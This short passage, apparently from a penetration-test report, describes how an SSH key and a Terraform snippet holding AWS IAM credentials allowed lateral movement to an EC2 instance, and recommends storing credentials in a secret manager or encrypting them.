The SSH key and terraform snippet that contained AWS IAM user credentials allowed us to discover and move laterally to an EC2 instance. Files in buckets and shares commonly contain credentials (against best practices). Credentials should be stored securely in a secret management solution like AWS Secrets Manager. If they have to be stored in an S3 bucket or file share then they should be encrypted or stored in an archive that is protected by a strong password.
